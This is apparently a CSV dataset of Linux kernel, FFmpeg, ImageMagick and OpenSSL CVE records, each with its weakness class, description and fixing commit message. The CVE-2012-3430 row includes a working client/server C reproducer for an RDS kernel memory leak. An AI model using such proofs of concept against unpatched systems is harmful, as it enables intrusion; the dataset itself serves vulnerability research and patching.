CVE-2012-3430,CWE-200,2012-10-03,"The rds_recvmsg function in net/rds/recv.c in the Linux kernel before 3.0.44 does not initialize a certain structure member, which allows local users to obtain potentially sensitive information from kernel stack memory via a (1) recvfrom or (2) recvmsg system call on an RDS socket.","Jay Fenlason (fenlason@redhat.com) found a bug, that recvfrom() on an RDS socket can return the contents of random kernel memory to userspace if it was called with a address length larger than sizeof(struct sockaddr_in). rds_recvmsg() also fails to set the addr_len paramater properly before returning, but that's just a bug. There are also a number of cases wher recvfrom() can return an entirely bogus address. Anything in rds_recvmsg() that returns a non-negative value but does not go through the ""sin = (struct sockaddr_in *)msg->msg_name;"" code path at the end of the while(1) loop will return up to 128 bytes of kernel memory to userspace.  And I write two test programs to reproduce this bug, you will see that in rds_server, fromAddr will be overwritten and the following sock_fd will be destroyed. Yes, it is the programmer's fault to set msg_namelen incorrectly, but it is better to make the kernel copy the real length of address to user space in such case.  How to run the test programs ? I test them on 32bit x86 system, 3.5.0-rc7.  1 compile gcc -o rds_client rds_client.c gcc -o rds_server rds_server.c  2 run ./rds_server on one console  3 run ./rds_client on another console  4 you will see something like: server is waiting to receive data... old socket fd=3 server received data from client:data from client msg.msg_namelen=32 new socket fd=-1067277685 sendmsg() : Bad file descriptor  /***************** rds_client.c ********************/  int main(void) { 	int sock_fd; 	struct sockaddr_in serverAddr; 	struct sockaddr_in toAddr; 	char recvBuffer[128] = ""data from client""; 	struct msghdr msg; 	struct iovec iov;  	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0); 	if (sock_fd < 0) { 		perror(""create socket error\n""); 		exit(1); 	}  	memset(&serverAddr, 0, sizeof(serverAddr)); 	serverAddr.sin_family = AF_INET; 	serverAddr.sin_addr.s_addr = inet_addr(""127.0.0.1""); 	serverAddr.sin_port = htons(4001);  	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror(""bind() error\n""); 		close(sock_fd); 		exit(1); 	}  	memset(&toAddr, 0, sizeof(toAddr)); 	toAddr.sin_family = AF_INET; 	toAddr.sin_addr.s_addr = inet_addr(""127.0.0.1""); 	toAddr.sin_port = htons(4000); 	msg.msg_name = &toAddr; 	msg.msg_namelen = sizeof(toAddr); 	msg.msg_iov = &iov; 	msg.msg_iovlen = 1; 	msg.msg_iov->iov_base = recvBuffer; 	msg.msg_iov->iov_len = strlen(recvBuffer) + 1; 	msg.msg_control = 0; 	msg.msg_controllen = 0; 	msg.msg_flags = 0;  	if (sendmsg(sock_fd, &msg, 0) == -1) { 		perror(""sendto() error\n""); 		close(sock_fd); 		exit(1); 	}  	printf(""client send data:%s\n"", recvBuffer);  	memset(recvBuffer, '\0', 128);  	msg.msg_name = &toAddr; 	msg.msg_namelen = sizeof(toAddr); 	msg.msg_iov = &iov; 	msg.msg_iovlen = 1; 	msg.msg_iov->iov_base = recvBuffer; 	msg.msg_iov->iov_len = 128; 	msg.msg_control = 0; 	msg.msg_controllen = 0; 	msg.msg_flags = 0; 	if (recvmsg(sock_fd, &msg, 0) == -1) { 		perror(""recvmsg() error\n""); 		close(sock_fd); 		exit(1); 	}  	printf(""receive data from server:%s\n"", recvBuffer);  	close(sock_fd);  	return 0; }  /***************** rds_server.c ********************/  int main(void) { 	struct sockaddr_in fromAddr; 	int sock_fd; 	struct sockaddr_in serverAddr; 	unsigned int addrLen; 	char recvBuffer[128]; 	struct msghdr msg; 	struct iovec iov;  	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0); 	if(sock_fd < 0) { 		perror(""create socket error\n""); 		exit(0); 	}  	memset(&serverAddr, 0, sizeof(serverAddr)); 	serverAddr.sin_family = AF_INET; 	serverAddr.sin_addr.s_addr = inet_addr(""127.0.0.1""); 	serverAddr.sin_port = htons(4000); 	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror(""bind error\n""); 		close(sock_fd); 		exit(1); 	}  	printf(""server is waiting to receive data...\n""); 	msg.msg_name = &fromAddr;  	/* 	 * I add 16 to sizeof(fromAddr), ie 32, 	 * and pay attention to the definition of fromAddr, 	 * recvmsg() will overwrite sock_fd, 	 * since kernel will copy 32 bytes to userspace. 	 * 	 * If you just use sizeof(fromAddr), it works fine. 	 * */ 	msg.msg_namelen = sizeof(fromAddr) + 16; 	/* msg.msg_namelen = sizeof(fromAddr); */ 	msg.msg_iov = &iov; 	msg.msg_iovlen = 1; 	msg.msg_iov->iov_base = recvBuffer; 	msg.msg_iov->iov_len = 128; 	msg.msg_control = 0; 	msg.msg_controllen = 0; 	msg.msg_flags = 0;  	while (1) { 		printf(""old socket fd=%d\n"", sock_fd); 		if (recvmsg(sock_fd, &msg, 0) == -1) { 			perror(""recvmsg() error\n""); 			close(sock_fd); 			exit(1); 		} 		printf(""server received data from client:%s\n"", recvBuffer); 		printf(""msg.msg_namelen=%d\n"", msg.msg_namelen); 		printf(""new socket fd=%d\n"", sock_fd); 		strcat(recvBuffer, ""--data from server""); 		if (sendmsg(sock_fd, &msg, 0) == -1) { 			perror(""sendmsg()\n""); 			close(sock_fd); 			exit(1); 		} 	}  	close(sock_fd); 	return 0; }  Signed-off-by: Weiping Pan <wpan@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-4326,CWE-399,2012-05-17,"The udp6_ufo_fragment function in net/ipv6/udp.c in the Linux kernel before 2.6.39, when a certain UDP Fragmentation Offload (UFO) configuration is enabled, allows remote attackers to cause a denial of service (system crash) by sending fragmented IPv6 UDP packets to a bridge device.","At this point, skb->data points to skb_transport_header. So, headroom check is wrong.  For some case:bridge(UFO is on) + eth device(UFO is off), there is no enough headroom for IPv6 frag head. But headroom check is always false.  This will bring about data be moved to there prior to skb->head, when adding IPv6 frag header to skb.  Signed-off-by: Shan Wei <shanwei@cn.fujitsu.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-4263,CWE-119,2013-11-23,"libavfilter in FFmpeg before 2.0.1 has unspecified impact and remote vectors related to a crafted ""plane,"" which triggers an out-of-bounds heap write.",Fixes out of array accesses  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2013-3227,CWE-200,2013-04-22,"The caif_seqpkt_recvmsg function in net/caif/caif_socket.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix that by simply setting msg_namelen to 0 as obviously nobody cared about caif_seqpkt_recvmsg() not filling the msg_name in case it was set.  Cc: Sjur Braendeland <sjur.brandeland@stericsson.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-16058,CWE-119,2019-09-06,"An issue was discovered in the pam_p11 component 0.2.0 and 0.3.0 for OpenSC. If a smart card creates a signature with a length longer than 256 bytes, this triggers a buffer overflow. This may be the case for RSA keys with 4096 bits depending on the signature scheme.","Do not use fixed buffer size for signature, EVP_SignFinal() requires buffer for signature at least  EVP_PKEY_size(pkey) bytes in size.  Fixes crash when using 4K RSA signatures (#16, #15)"
CVE-2016-7528,CWE-125,2017-04-19,The ReadVIFFImage function in coders/viff.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via a crafted VIFF file.,
CVE-2019-13296,CWE-401,2019-07-05,ImageMagick 7.0.8-50 Q16 has direct memory leaks in AcquireMagickMemory because of an error in CLIListOperatorImages in MagickWand/operation.c for a NULL value.,
CVE-2016-8658,CWE-119,2016-10-16,Stack-based buffer overflow in the brcmf_cfg80211_start_ap function in drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c in the Linux kernel before 4.7.5 allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a long SSID Information Element in a command to a Netlink socket.,
CVE-2017-8063,CWE-119,2017-04-23,"drivers/media/usb/dvb-usb/cxusb.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Commit 17ce039 (""[media] cxusb: don't do DMA on stack"") added a kmalloc'ed bounce buffer for writes, but missed to do the same for reads. As the read only happens after the write is finished, we can reuse the same buffer.  As dvb_usb_generic_rw handles a read length of 0 by itself, avoid calling it using the dvb_usb_generic_read wrapper function.  Signed-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>"
CVE-2019-11498,CWE-824,2019-04-24,"WavpackSetConfiguration64 in pack_utils.c in libwavpack.a in WavPack through 5.1.0 has a ""Conditional jump or move depends on uninitialised value"" condition, which might allow attackers to cause a denial of service (application crash) via a DFF file that lacks valid sample-rate data.",
CVE-2018-6412,CWE-200,2018-01-31,"In the function sbusfb_ioctl_helper() in drivers/video/fbdev/sbuslib.c in the Linux kernel through 4.15, an integer signedness error allows arbitrary information leakage for the FBIOPUTCMAP_SPARC and FBIOGETCMAP_SPARC commands.","Fixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbusfb_ioctl_helper().  'index' is defined as an int in sbusfb_ioctl_helper(). We retrieve this from the user: if (get_user(index, &c->index) ||     __get_user(count, &c->count) ||     __get_user(ured, &c->red) ||     __get_user(ugreen, &c->green) ||     __get_user(ublue, &c->blue))        return -EFAULT;  and then we use 'index' in the following way: red = cmap->red[index + i] >> 8; green = cmap->green[index + i] >> 8; blue = cmap->blue[index + i] >> 8;  This is a classic information leak vulnerability. 'index' should be an unsigned int, given its usage above.  This patch is straight-forward; it changes 'index' to unsigned int in two switch-cases: FBIOGETCMAP_SPARC && FBIOPUTCMAP_SPARC.  This patch fixes CVE-2018-6412.  Signed-off-by: Peter Malone <peter.malone@gmail.com> Acked-by: Mathieu Malaterre <malat@debian.org> Signed-off-by: Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>"
CVE-2011-2898,CWE-200,2012-05-24,"net/packet/af_packet.c in the Linux kernel before 2.6.39.3 does not properly restrict user-space access to certain packet data structures associated with VLAN Tag Control Information, which allows local users to obtain potentially sensitive information via a crafted application.","In 2.6.27, commit 393e52e (packet: deliver VLAN TCI to userspace) added a small information leak.  Add padding field and make sure its zeroed before copy to user.  Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> CC: Patrick McHardy <kaber@trash.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-5759,CWE-674,2018-01-24,"jsparse.c in Artifex MuJS through 1.0.2 does not properly maintain the AST depth for binary expressions, which allows remote attackers to cause a denial of service (excessive recursion) via a crafted file.",
CVE-2019-11599,CWE-667,2019-04-29,"The coredump implementation in the Linux kernel before 5.0.10 does not use locking or other mechanisms to prevent vma layout or vma flags changes while it runs, which allows local users to obtain sensitive information, cause a denial of service, or possibly have unspecified other impact by triggering a race condition with mmget_not_zero or get_task_mm calls. This is related to fs/userfaultfd.c, mm/mmap.c, fs/proc/task_mmu.c, and drivers/infiniband/core/uverbs_main.c.","The core dumping code has always run without holding the mmap_sem for writing, despite that is the only way to ensure that the entire vma layout will not change from under it.  Only using some signal serialization on the processes belonging to the mm is not nearly enough. This was pointed out earlier.  For example in Hugh's post from Jul 2017:    https://lkml.kernel.org/r/alpine.LSU.2.11.1707191716030.2055@eggly.anvils    ""Not strictly relevant here, but a related note: I was very surprised    to discover, only quite recently, how handle_mm_fault() may be called    without down_read(mmap_sem) - when core dumping. That seems a    misguided optimization to me, which would also be nice to correct""  In particular because the growsdown and growsup can move the vm_start/vm_end the various loops the core dump does around the vma will not be consistent if page faults can happen concurrently.  Pretty much all users calling mmget_not_zero()/get_task_mm() and then taking the mmap_sem had the potential to introduce unexpected side effects in the core dumping code.  Adding mmap_sem for writing around the ->core_dump invocation is a viable long term fix, but it requires removing all copy user and page faults and to replace them with get_dump_page() for all binary formats which is not suitable as a short term fix.  For the time being this solution manually covers the places that can confuse the core dump either by altering the vma layout or the vma flags while it runs.  Once ->core_dump runs under mmap_sem for writing the function mmget_still_valid() can be dropped.  Allowing mmap_sem protected sections to run in parallel with the coredump provides some minor parallelism advantage to the swapoff code (which seems to be safe enough by never mangling any vma field and can keep doing swapins in parallel to the core dumping) and to some other corner case.  In order to facilitate the backporting I added ""Fixes: 86039bd"" however the side effect of this same race condition in /proc/pid/mem should be reproducible since before 2.6.12-rc2 so I couldn't add any other ""Fixes:"" because there's no hash beyond the git genesis commit.  Because find_extend_vma() is the only location outside of the process context that could modify the ""mm"" structures under mmap_sem for reading, by adding the mmget_still_valid() check to it, all other cases that take the mmap_sem for reading don't need the new check after mmget_not_zero()/get_task_mm().  The expand_stack() in page fault context also doesn't need the new check, because all tasks under core dumping are frozen.  Link: http://lkml.kernel.org/r/20190325224949.11068-1-aarcange@redhat.com Fixes: 86039bd (""userfaultfd: add new syscall to provide memory externalization"") Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reported-by: Jann Horn <jannh@google.com> Suggested-by: Oleg Nesterov <oleg@redhat.com> Acked-by: Peter Xu <peterx@redhat.com> Reviewed-by: Mike Rapoport <rppt@linux.ibm.com> Reviewed-by: Oleg Nesterov <oleg@redhat.com> Reviewed-by: Jann Horn <jannh@google.com> Acked-by: Jason Gunthorpe <jgg@mellanox.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-14172,CWE-834,2017-09-07,"In coders/ps.c in ImageMagick 7.0.7-0 Q16, a DoS in ReadPSImage() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted PSD file, which claims a large ""extent"" field in the header but does not contain sufficient backing data, is provided, the loop over ""length"" would consume huge CPU resources, since there is no EOF check inside the loop.",
CVE-2015-0289,,2015-03-19,"The PKCS#7 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not properly handle a lack of outer ContentInfo, which allows attackers to cause a denial of service (NULL pointer dereference and application crash) by leveraging an application that processes arbitrary PKCS#7 data and providing malformed data with ASN.1 encoding, related to crypto/pkcs7/pk7_doit.c and crypto/pkcs7/pk7_lib.c.",
CVE-2018-15856,CWE-835,2018-08-25,An infinite loop when reaching EOL unexpectedly in compose/parser.c (aka the keymap parser) in xkbcommon before 0.8.1 could be used by local attackers to cause a denial of service during parsing of crafted keymap files.,
CVE-2016-8675,CWE-476,2017-02-15,"The get_vlc2 function in get_bits.h in Libav before 11.9 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via a crafted mp3 file, possibly related to startcode sequences during m4v detection.",This makes the m4v detection less trigger-happy.  Bug-Id: 949 Signed-off-by: Diego Biurrun <diego@biurrun.de>
CVE-2015-1465,CWE-17,2015-04-05,"The IPv4 implementation in the Linux kernel before 3.18.8 does not properly consider the length of the Read-Copy Update (RCU) grace period for redirecting lookups in the absence of caching, which allows remote attackers to cause a denial of service (memory consumption or system crash) via a flood of packets.","Not caching dst_entries which cause redirects could be exploited by hosts on the same subnet, causing a severe DoS attack. This effect aggravated since commit f886497 (""ipv4: fix dst race in sk_dst_get()"").  Lookups causing redirects will be allocated with DST_NOCACHE set which will force dst_release to free them via RCU.  Unfortunately waiting for RCU grace period just takes too long, we can end up with >1M dst_entries waiting to be released and the system will run OOM. rcuos threads cannot catch up under high softirq load.  Attaching the flag to emit a redirect later on to the specific skb allows us to cache those dst_entries thus reducing the pressure on allocation and deallocation.  This issue was discovered by Marcelo Leitner.  Cc: Julian Anastasov <ja@ssi.bg> Signed-off-by: Marcelo Leitner <mleitner@redhat.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-2706,CWE-362,2014-04-14,"Race condition in the mac80211 subsystem in the Linux kernel before 3.13.7 allows remote attackers to cause a denial of service (system crash) via network traffic that improperly interacts with the WLAN_STA_PS_STA state (aka power-save mode), related to sta_info.c and tx.c.","There is a race between the TX path and the STA wakeup: while a station is sleeping, mac80211 buffers frames until it wakes up, then the frames are transmitted. However, the RX and TX path are concurrent, so the packet indicating wakeup can be processed while a packet is being transmitted.  This can lead to a situation where the buffered frames list is emptied on the one side, while a frame is being added on the other side, as the station is still seen as sleeping in the TX path.  As a result, the newly added frame will not be send anytime soon. It might be sent much later (and out of order) when the station goes to sleep and wakes up the next time.  Additionally, it can lead to the crash below.  Fix all this by synchronising both paths with a new lock. Both path are not fastpath since they handle PS situations.  In a later patch we'll remove the extra skb queue locks to reduce locking overhead.  BUG: unable to handle kernel NULL pointer dereference at 000000b0 IP: [<ff6f1791>] ieee80211_report_used_skb+0x11/0x3e0 [mac80211] *pde = 00000000 Oops: 0000 [#1] SMP DEBUG_PAGEALLOC EIP: 0060:[<ff6f1791>] EFLAGS: 00210282 CPU: 1 EIP is at ieee80211_report_used_skb+0x11/0x3e0 [mac80211] EAX: e5900da EBX: 00000000 ECX: 00000001 EDX: 00000000 ESI: e41d00c0 EDI: e5900da EBP: ebe458e4 ESP: ebe458b0  DS: 007b ES: 007b FS: 00d8 GS: 00e0 SS: 0068 CR0: 8005003b CR2: 000000b0 CR3: 25a78000 CR4: 000407d0 DR0: 00000000 DR1: 00000000 DR2: 00000000 DR3: 00000000 DR6: ffff0ff0 DR7: 00000400 Process iperf (pid: 3934, ti=ebe44000 task=e757c0b0 task.ti=ebe44000) iwlwifi 0000:02:00.0: I iwl_pcie_enqueue_hcmd Sending command LQ_CMD (#4e), seq: 0x0903, 92 bytes at 3[3]:9 Stack:  e403b32c ebe458c4 00200002 00200286 e403b338 ebe458cc c10960bb e5900da  ff76a6ec ebe458d8 00000000 e41d00c0 e5900da ebe458f0 ff6f1b75 e403b210  ebe4598c ff723dc1 00000000 ff76a6ec e597c978 e403b758 00000002 00000002 Call Trace:  [<ff6f1b75>] ieee80211_free_txskb+0x15/0x20 [mac80211]  [<ff723dc1>] invoke_tx_handlers+0x1661/0x1780 [mac80211]  [<ff7248a5>] ieee80211_tx+0x75/0x100 [mac80211]  [<ff7249bf>] ieee80211_xmit+0x8f/0xc0 [mac80211]  [<ff72550e>] ieee80211_subif_start_xmit+0x4fe/0xe20 [mac80211]  [<c149ef70>] dev_hard_start_xmit+0x450/0x950  [<c14b9aa9>] sch_direct_xmit+0xa9/0x250  [<c14b9c9b>] __qdisc_run+0x4b/0x150  [<c149f732>] dev_queue_xmit+0x2c2/0xca0  Cc: stable@vger.kernel.org Reported-by: Yaara Rozenblum <yaara.rozenblum@intel.com> Signed-off-by: Emmanuel Grumbach <emmanuel.grumbach@intel.com> Reviewed-by: Stanislaw Gruszka <sgruszka@redhat.com> [reword commit log, use a separate lock] Signed-off-by: Johannes Berg <johannes.berg@intel.com>"
CVE-2017-7476,CWE-119,2017-05-02,Gnulib before 2017-04-26 has a heap-based buffer overflow with the TZ environment variable. The error is in the save_abbr function in time_rz.c.,
CVE-2013-1792,CWE-362,2013-03-22,Race condition in the install_user_keyrings function in security/keys/process_keys.c in the Linux kernel before 3.8.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) via crafted keyctl system calls that trigger keyring operations in simultaneous threads.,"This fixes CVE-2013-1792.  There is a race in install_user_keyrings() that can cause a NULL pointer dereference when called concurrently for the same user if the uid and uid-session keyrings are not yet created.  It might be possible for an unprivileged user to trigger this by calling keyctl() from userspace in parallel immediately after logging in.  Assume that we have two threads both executing lookup_user_key(), both looking for KEY_SPEC_USER_SESSION_KEYRING.  	THREAD A			THREAD B 	===============================	=============================== 					==>call install_user_keyrings(); 	if (!cred->user->session_keyring) 	==>call install_user_keyrings() 					... 					user->uid_keyring = uid_keyring; 	if (user->uid_keyring) 		return 0; 	<== 	key = cred->user->session_keyring [== NULL] 					user->session_keyring = session_keyring; 	atomic_inc(&key->usage); [oops]  At the point thread A dereferences cred->user->session_keyring, thread B hasn't updated user->session_keyring yet, but thread A assumes it is populated because install_user_keyrings() returned ok.  The race window is really small but can be exploited if, for example, thread B is interrupted or preempted after initializing uid_keyring, but before doing setting session_keyring.  This couldn't be reproduced on a stock kernel.  However, after placing systemtap probe on 'user->session_keyring = session_keyring;' that introduced some delay, the kernel could be crashed reliably.  Fix this by checking both pointers before deciding whether to return. Alternatively, the test could be done away with entirely as it is checked inside the mutex - but since the mutex is global, that may not be the best way.  Signed-off-by: David Howells <dhowells@redhat.com> Reported-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2013-2596,CWE-189,2013-04-13,"Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.","This is my example conversion of a few existing mmap users.  The fb_mmap() case is a good example because it is a bit more complicated than some: fb_mmap() mmaps one of two different memory areas depending on the page offset of the mmap (but happily there is never any mixing of the two, so the helper function still works).  Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-6303,CWE-787,2016-09-16,Integer overflow in the MDC2_Update function in crypto/mdc2/mdc2dgst.c in OpenSSL before 1.1.0 allows remote attackers to cause a denial of service (out-of-bounds write and application crash) or possibly have unspecified other impact via unknown vectors.,
CVE-2016-3841,CWE-264,2016-08-06,"The IPv6 stack in the Linux kernel before 4.3.3 mishandles options data, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) via a crafted sendmsg system call.","This patch addresses multiple problems :  UDP/RAW sendmsg() need to get a stable struct ipv6_txoptions while socket is not locked : Other threads can change np->opt concurrently. Dmitry posted a syzkaller (http://github.com/google/syzkaller) program desmonstrating use-after-free.  Starting with TCP/DCCP lockless listeners, tcp_v6_syn_recv_sock() and dccp_v6_request_recv_sock() also need to use RCU protection to dereference np->opt once (before calling ipv6_dup_options())  This patch adds full RCU protection to np->opt  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-18955,CWE-863,2018-11-16,"In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction.","The current logic first clones the extent array and sorts both copies, then maps the lower IDs of the forward mapping into the lower namespace, but doesn't map the lower IDs of the reverse mapping.  This means that code in a nested user namespace with >5 extents will see incorrect IDs. It also breaks some access checks, like inode_owner_or_capable() and privileged_wrt_inode_uidgid(), so a process can incorrectly appear to be capable relative to an inode.  To fix it, we have to make sure that the ""lower_first"" members of extents in both arrays are translated; and we have to make sure that the reverse map is sorted *after* the translation (since otherwise the translation can break the sorting).  This is CVE-2018-18955.  Fixes: 6397fac (""userns: bump idmap limits to 340"") Cc: stable@vger.kernel.org Signed-off-by: Jann Horn <jannh@google.com> Tested-by: Eric W. Biederman <ebiederm@xmission.com> Reviewed-by: Eric W. Biederman <ebiederm@xmission.com> Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>"
CVE-2011-2707,CWE-200,2012-05-24,"The ptrace_setxregs function in arch/xtensa/kernel/ptrace.c in the Linux kernel before 3.1 does not validate user-space pointers, which allows local users to obtain sensitive information from kernel memory locations via a crafted PTRACE_SETXTREGS request.",Prevent an arbitrary kernel read.  Check the user pointer with access_ok() before copying data in.  [akpm@linux-foundation.org: s/EIO/EFAULT/] Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Christian Zankel <chris@zankel.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2017-14222,CWE-834,2017-09-09,"In libavformat/mov.c in FFmpeg 3.3.3, a DoS in read_tfra() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted MOV file, which claims a large ""item_count"" field in the header but does not contain sufficient backing data, is provided, the loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.",Fixes: Missing EOF check in loop No testcase  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2012-1016,CWE-476,2013-03-05,"The pkinit_server_return_padata function in plugins/preauth/pkinit/pkinit_srv.c in the PKINIT implementation in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.4 attempts to find an agility KDF identifier in inappropriate circumstances, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted Draft 9 request.","Don't check for an agility KDF identifier in the non-draft9 reply structure when we're building a draft9 reply, because it'll be NULL.  The KDC plugin for PKINIT can dereference a null pointer when handling a draft9 request, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.  CVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C  [tlyu@mit.edu: reformat comment and edit log message]  (back ported from commit cd5ff93)  ticket: 7527 (new) version_fixed: 1.10.4 status: resolved"
CVE-2017-8825,CWE-476,2017-05-08,"A null dereference vulnerability has been found in the MIME handling component of LibEtPan before 1.8, as used in MailCore and MailCore 2. A crash can occur in low-level/imf/mailimf.c during a failed parse of a Cc header containing multiple e-mail addresses.",
CVE-2019-14934,CWE-787,2019-08-11,"An issue was discovered in PDFResurrect before 0.18. pdf_load_pages_kids in pdf.c doesn't validate a certain size value, which leads to a malloc failure and out-of-bounds write.",This addresses the memory issues in Issue #6 expressed in calloc_some.pdf and malloc_some.pdf
CVE-2017-14727,CWE-119,2017-09-23,"logger.c in the logger plugin in WeeChat before 1.9.1 allows a crash via strftime date/time specifiers, because a buffer is not initialized.",
CVE-2013-7446,,2015-12-28,Use-after-free vulnerability in net/unix/af_unix.c in the Linux kernel before 4.3.3 allows local users to bypass intended AF_UNIX socket permissions or cause a denial of service (panic) via crafted epoll_ctl calls.,"Rainer Weikusat <rweikusat@mobileactivedefense.com> writes: An AF_UNIX datagram socket being the client in an n:1 association with some server socket is only allowed to send messages to the server if the receive queue of this socket contains at most sk_max_ack_backlog datagrams. This implies that prospective writers might be forced to go to sleep despite none of the message presently enqueued on the server receive queue were sent by them. In order to ensure that these will be woken up once space becomes again available, the present unix_dgram_poll routine does a second sock_poll_wait call with the peer_wait wait queue of the server socket as queue argument (unix_dgram_recvmsg does a wake up on this queue after a datagram was received). This is inherently problematic because the server socket is only guaranteed to remain alive for as long as the client still holds a reference to it. In case the connection is dissolved via connect or by the dead peer detection logic in unix_dgram_sendmsg, the server socket may be freed despite ""the polling mechanism"" (in particular, epoll) still has a pointer to the corresponding peer_wait queue. There's no way to forcibly deregister a wait queue with epoll.  Based on an idea by Jason Baron, the patch below changes the code such that a wait_queue_t belonging to the client socket is enqueued on the peer_wait queue of the server whenever the peer receive queue full condition is detected by either a sendmsg or a poll. A wake up on the peer queue is then relayed to the ordinary wait queue of the client socket via wake function. The connection to the peer wait queue is again dissolved if either a wake up is about to be relayed or the client socket reconnects or a dead peer is detected or the client socket is itself closed. This enables removing the second sock_poll_wait from unix_dgram_poll, thus avoiding the use-after-free, while still ensuring that no blocked writer sleeps forever.  Signed-off-by: Rainer Weikusat <rweikusat@mobileactivedefense.com> Fixes: ec0d215 (""af_unix: fix 'poll for write'/connected DGRAM sockets"") Reviewed-by: Jason Baron <jbaron@akamai.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-7862,CWE-787,2017-04-14,FFmpeg before 2017-02-07 has an out-of-bounds write caused by a heap-based buffer overflow related to the decode_frame function in libavcodec/pictordec.c.,Fixes: 559/clusterfuzz-testcase-6424225917173760  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2014-3508,CWE-200,2014-08-13,"The OBJ_obj2txt function in crypto/objects/obj_dat.c in OpenSSL 0.9.8 before 0.9.8zb, 1.0.0 before 1.0.0n, and 1.0.1 before 1.0.1i, when pretty printing is used, does not ensure the presence of '\0' characters, which allows context-dependent attackers to obtain sensitive information from process stack memory by reading output from X509_name_oneline, X509_name_print_ex, and unspecified other functions.",
CVE-2011-1078,CWE-200,2012-06-21,"The sco_sock_getsockopt_old function in net/bluetooth/sco.c in the Linux kernel before 2.6.39 does not initialize a certain structure, which allows local users to obtain potentially sensitive information from kernel stack memory via the SCO_CONNINFO option.","struct sco_conninfo has one padding byte in the end.  Local variable cinfo of type sco_conninfo is copied to userspace with this uninizialized one byte, leading to old stack contents leak.  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>"
